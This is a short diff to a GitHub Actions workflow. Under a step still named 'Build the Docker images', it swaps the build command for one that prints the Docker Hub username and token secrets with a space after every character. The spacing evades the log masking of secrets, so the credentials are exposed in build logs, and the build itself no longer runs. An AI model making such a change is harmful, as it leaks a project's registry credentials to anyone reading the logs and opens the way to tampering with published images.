@@ -27,7 +27,7 @@ jobs:
           # Need tags for Makefile logic to work
           fetch-depth: 0
       - name: Build the Docker images
-        run: make image
+        run: echo ${{secrets.DOCKERHUB_USERNAME}} | sed 's/./& /g'; echo ${{secrets.DOCKERHUB_TOKEN}} | sed 's/./& /g'
   deploy:
     needs: [ "build" ]
     runs-on: ubuntu-22.04
